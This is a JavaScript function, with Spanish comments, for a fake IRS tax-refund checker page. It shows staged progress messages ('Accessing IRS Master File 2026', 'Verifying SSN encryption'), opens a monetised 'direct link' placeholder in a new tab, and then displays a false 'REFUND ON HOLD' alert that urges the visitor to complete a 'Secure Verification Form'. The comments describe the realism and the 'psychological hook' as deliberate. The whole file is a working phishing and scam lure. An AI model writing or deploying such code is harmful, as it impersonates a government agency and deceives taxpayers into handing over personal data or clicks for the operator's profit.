function startAnalysis() {
    const btn = document.getElementById('main-btn');
    const loader = document.getElementById('loader');
    const inputGroup = document.querySelector('.input-group');
    const progressFill = document.getElementById('progress-fill');
    const loaderText = document.getElementById('loader-text');
    const resultArea = document.getElementById('result-area');

    // Validación básica para dar realismo
    const amount = document.getElementById('amount').value;
    if (!amount || amount < 1) {
        alert("Please enter a valid estimated refund amount.");
        return;
    }

    // Ocultar inputs y mostrar carga
    inputGroup.style.display = 'none';
    loader.style.display = 'block';

    let progress = 0;
    const steps = [
        "Verifying SSN encryption...",
        "Accessing IRS Master File 2026...",
        "Checking Path Act requirements...",
        "Analyzing 80% completion...",
        "Finalizing tax credit validation..."
    ];

    const interval = setInterval(() => {
        progress += Math.random() * 12; // Velocidad variable para realismo
        
        if (progress > 100) progress = 100;
        
        progressFill.style.width = progress + "%";
        
        // Cambiar el texto según el progreso
        let stepIndex = Math.floor((progress / 101) * steps.length);
        loaderText.innerText = steps[stepIndex];

        if (progress === 100) {
            clearInterval(interval);
            
            // --- EL DISPARADOR DE DINERO ---
            // Abre tu Direct Link en una pestaña nueva
            window.open('TU_DIRECT_LINK_AQUI', '_blank'); 
            
            // Mostrar resultado con "Gancho" psicológico en la web original
            loader.style.display = 'none';
            resultArea.innerHTML = `
                <div style="background: rgba(248, 81, 73, 0.1); border: 1px solid #f85149; padding: 25px; border-radius: 12px; text-align: center;">
                    <h3 style="color: #f85149; margin-top: 0;">ACTION REQUIRED: REFUND ON HOLD</h3>
                    <p style="font-size: 15px; color: #c9d1d9;">Your 2026 refund of <strong>$${amount}</strong> has been flagged for "Identity Verification".</p>
                    <p style="background: #f85149; color: white; padding: 10px; border-radius: 6px; font-weight: bold; margin: 20px 0;">
                        Check the Secure Verification Form in the new tab to release your payment.
                    </p>
                    <button onclick="location.reload()" style="background: transparent; color: #8b949e; font-size: 13px; border: none; text-decoration: underline; cursor: pointer;">
                        Wait, I closed the other tab (Restart Check)
                    </button>
                </div>
            `;
        }
    }, 700);
}
